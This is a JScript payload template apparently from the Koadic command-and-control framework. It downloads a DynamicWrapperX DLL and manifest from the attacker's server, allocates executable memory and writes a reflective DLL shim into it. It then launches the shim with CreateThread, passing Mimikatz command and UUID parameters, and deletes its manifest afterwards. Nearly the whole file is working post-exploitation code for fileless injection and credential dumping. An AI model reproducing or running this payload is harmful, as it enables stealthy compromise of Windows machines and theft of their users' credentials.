function win32_register_via_dynwrapx(manifestPath)
{
    var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );

    actCtx.Manifest = manifestPath;

    var win32 = actCtx.CreateObject("DynamicWrapperX");

    win32.Register("user32.dll", "MessageBoxW", "i=hwwu", "r=l");  // Register a dll function
    win32.Register("kernel32.dll", "VirtualAlloc", "i=puuu", "r=p");
    win32.Register("kernel32.dll", "OpenProcess", "i=uuu", "r=h");
    win32.Register("kernel32.dll", "GetCurrentProcess", "r=h");
    win32.Register("kernel32.dll", "WriteProcessMemory", "i=hllll", "r=u");
    win32.Register("kernel32.dll", "CreateThread", "i=llplll", "r=h");
    win32.Register("kernel32.dll", "WaitForSingleObject", "i=hu", "r=u");

    return win32;
}

function win32_write_memory(win32, str)
{
    var commit = 0x00003000; /* MEM_COMMIT | MEM_RESERVE */
    var guard = 0x40; /*PAGE_EXECUTE_READWRITE*/

    var pMem = win32.VirtualAlloc(0, str.length * 4, commit, guard);
    var pProcess = win32.GetCurrentProcess();

    for (var i = 0; i < str.length; ++i)
    {
        win32.NumPut(str[i], pMem, i * 4, "u");
    }

    return pMem;
}

try
{
    var manifestPath = Koadic.file.getPath("~DIRECTORY~\\dynwrapx.manifest");
    Koadic.http.download(manifestPath, "~MANIFESTUUID~");

    Koadic.http.download("~DIRECTORY~\\dynwrapx.dll", "~DLLUUID~");

    var win32 = win32_register_via_dynwrapx(manifestPath)
    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();

    var arrDLL = [
      ~SHIMX86BYTES~
    ];

    var pMem = win32_write_memory(win32, arrDLL);

    var pReflective  = pMem + ~SHIMX86OFFSET~;

    var thread = win32.CreateThread(0, 0, pReflective, win32.StrPtr(shim_lpParam), 0, 0);
    win32.WaitForSingleObject(thread, 100000);

    //Koadic.work.report("Success");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.file.deleteFile(manifestPath);
Koadic.exit();
